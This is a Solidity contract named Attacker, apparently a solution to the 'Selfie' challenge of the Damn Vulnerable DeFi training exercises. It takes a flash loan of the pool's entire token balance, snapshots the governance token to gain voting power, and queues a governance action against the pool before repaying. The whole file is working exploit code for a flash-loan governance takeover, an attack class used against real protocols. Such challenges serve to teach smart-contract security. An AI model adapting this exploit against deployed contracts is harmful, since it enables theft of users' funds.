//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {SelfiePool} from "../src/SelfiePool.sol";
import {SimpleGovernance} from "../src/SimpleGovernance.sol";
import "./DamnValuableTokenSnapshot.sol";
import "../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker is IERC3156FlashBorrower {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;

    constructor(
        SelfiePool _selfiePool,
        SimpleGovernance _simpleGovernance
    ) payable {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack(bytes calldata data) external {
        selfiePool.flashLoan(
            IERC3156FlashBorrower(this),
            address(selfiePool.token()),
            selfiePool.maxFlashLoan(address(selfiePool.token())),
            data
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        selfiePool.token().approve(address(selfiePool), amount);
        DamnValuableTokenSnapshot(address(selfiePool.token())).snapshot();
        simpleGovernance.queueAction(address(selfiePool), 0, data);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
